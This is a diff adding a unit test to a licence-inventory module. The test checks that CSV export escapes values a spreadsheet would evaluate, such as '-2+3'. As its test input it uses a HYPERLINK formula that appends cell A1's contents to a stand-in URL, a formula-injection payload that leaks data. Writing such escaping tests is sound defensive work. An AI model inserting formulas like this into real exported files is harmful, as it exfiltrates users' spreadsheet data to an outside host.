@@ -96,6 +96,27 @@ describe('licenseInventory', () => {
     expect(md).toContain('states nothing about what a licence obliges');
     expect(md).toContain('With a value that is not an SPDX expression: 1');
   });
+
+  it('exports an identifier a spreadsheet would compute as text', () => {
+    // `-2+3` is a valid idstring (letters, digits, `.`, `-`, `+`); Excel would show 1.
+    const ws = addDocument(
+      emptyWorkspace,
+      spdx([['PackageLicenseDeclared: -2+3'], ['PackageLicenseDeclared: MIT']]),
+    ).workspace;
+    const lines = licenseInventoryToCsv(licenseInventory(ws)).split('\n');
+    expect(lines).toContain("'-2+3,unknown,1,0,1,1");
+    expect(lines).toContain('MIT,listed,1,0,1,1');
+
+    const row = { kind: 'unknown', declared: 1, concluded: 0, packages: 1, documents: 1 } as const;
+    const csv = licenseInventoryToCsv({
+      rows: [{ id: '=HYPERLINK("http://example.org/?"&A1,"click")', ...row }],
+      packagesTotal: 1,
+      withoutDeclared: 0,
+      withoutConcluded: 1,
+      unparseable: 0,
+    });
+    expect(csv.split('\n')[1]).toBe(`"'=HYPERLINK(""http://example.org/?""&A1,""click"")",unknown,1,0,1,1`);
+  });
 });
 
 describe('licenseInventory on SPDX 3', () => {
